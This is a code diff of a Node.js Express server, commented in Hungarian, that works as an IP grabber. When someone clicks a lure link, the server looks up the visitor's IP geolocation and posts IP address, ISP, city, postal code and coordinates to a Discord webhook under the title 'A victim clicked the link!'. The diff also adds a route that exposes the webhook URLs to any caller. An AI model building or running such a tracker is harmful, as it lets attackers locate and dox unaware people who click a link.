@@ -1,3 +1,5 @@
+// server.js
+
 const express = require('express');
 const axios = require('axios');
 require('dotenv').config();
@@ -8,10 +10,17 @@ const port = process.env.PORT || 3000;
 // Statikus fájlok
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Webhook URL és IPINFO token a .env fájlból
+// Webhook URL-k és IPINFO token a .env fájlból
 const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
 const ipinfoToken = process.env.IPINFO_TOKEN;
 
+// /get-webhook-url útvonal a webhook URL-k elküldéséhez
+app.get('/get-webhook-url', (req, res) => {
+    res.json({ webhookUrl, altWebhookUrl });
+});
+
+// /send-ip útvonal
 app.get('/send-ip', async (req, res) => {
     const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
 
@@ -27,28 +36,17 @@ app.get('/send-ip', async (req, res) => {
             content: `<@1095731086513930260>`,
             embeds: [{
                 title: "Egy áldozat rákattintott a linkre!",
-                description: `**IP-cím >>** ${userIp}
-**Hálózat >>** ${geoData.org || 'N/A'}
-**Város >>** ${geoData.city || 'N/A'}
-**Régió >>** ${geoData.region || 'N/A'}
-**Ország >>** ${geoData.country || 'N/A'}
-**Irányítószám >>** ${geoData.postal || 'N/A'}
-**Szélesség >>** ${latitude}
-**Hosszúság >>** ${longitude}`,
+                description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.postal || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
                 color: 0x800080
             }]
         };
 
         await axios.post(webhookUrl, message);
-        res.send('IP és helyadatok sikeresen elküldve Discordra!');
+        res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
     } catch (error) {
         console.error('Hiba:', error.message);
         res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
     }
-});
-
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.listen(port, () => {
